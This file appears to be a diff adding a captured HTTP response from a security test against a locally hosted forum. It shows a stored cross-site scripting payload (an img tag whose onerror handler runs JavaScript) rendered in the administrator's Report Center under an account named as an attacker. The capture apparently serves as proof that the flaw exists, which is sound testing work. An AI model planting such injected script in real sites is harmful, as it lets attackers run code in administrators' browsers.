@@ -1,0 +1,13 @@
+HTTP/1.1 200
+
+... region around the stored payload in the admin's Report Center ...
+
+p?pid=2#pid2">Post</a> by <a href="http://localhost:25850/member.php?action=profile&uid=8">attacker_602d8bd4</a>
+                in <a href="showthread.php?tid=2"><img src=x onerror="alert(document.domain);window.__xss='xssd0210c'"></a>
+                    </div>
+        <div class="report__reason">
+                            Inappropriate Content
+                    </div>
+    </div>
+    <div class="row__secondary">
+        <div class
